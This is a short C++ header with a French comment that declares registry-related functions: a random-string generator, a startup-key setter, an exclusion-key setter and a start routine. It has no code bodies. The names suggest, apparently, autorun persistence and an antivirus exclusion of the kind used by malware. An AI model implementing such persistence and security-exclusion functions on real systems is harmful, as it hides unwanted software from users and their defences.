#pragma once
#include "settings.h"

// Déclarations des fonctions liées au registre
std::wstring GenerateRandom(int length);
void SetStartKey(const std::wstring& registryKey, const std::wstring& value);
void SetExclusionKey(const wchar_t* value);
void Start(void);